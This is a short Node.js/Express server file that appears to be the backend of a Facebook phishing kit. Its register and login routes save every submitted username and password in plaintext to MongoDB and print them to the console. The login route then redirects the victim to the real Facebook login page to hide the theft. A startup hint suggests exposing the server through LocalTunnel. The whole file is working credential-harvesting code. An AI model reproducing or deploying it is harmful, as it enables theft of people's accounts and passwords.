require('dotenv').config();
const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const path = require('path');
const dns = require('dns');

// Set DNS servers for better connectivity
dns.setServers(['8.8.8.8', '8.8.4.4']);

const app = express();
const port = process.env.PORT || 3000;

// MongoDB Connection
mongoose.connect(process.env.MONGO_URI)
    .then(() => console.log('✅ MongoDB Connected'))
    .catch(err => console.error('❌ MongoDB Connection Error:', err));

// User Schema
const userSchema = new mongoose.Schema({
    username: String,
    password: String,
    timestamp: { type: Date, default: Date.now }
});
const User = mongoose.model('User', userSchema);

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname, 'template')));

// Register Route
app.post('/register', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    try {
        const newUser = new User({ username, password });
        await newUser.save();

        console.log(`[REGISTER] User: ${username}, Password: ${password}`);
        res.status(200).send('User registered successfully');
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).send('Server error');
    }
});

// Login Route (Now stores every login attempt)
app.post('/login', async (req, res) => {
    const { username, password } = req.body;

    if (!username || !password) {
        return res.status(400).send('Username and password are required');
    }

    try {
        const newUser = new User({ username, password });
        await newUser.save();

        console.log(`[LOGIN] User: ${username}, Password: ${password}`);
        res.status(200).json({ redirectUrl: 'https://www.facebook.com/login' });
    } catch (err) {
        console.error('❌ Error:', err);
        res.status(500).send('Server error');
    }
});

// Serve index.html
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'template', 'index.html'));
});

// Start Server
app.listen(port, () => {
    console.log(`🚀 Server running at http://localhost:${port}`);
    console.log(`🌍 Use LocalTunnel: lt --port ${port}`);
});
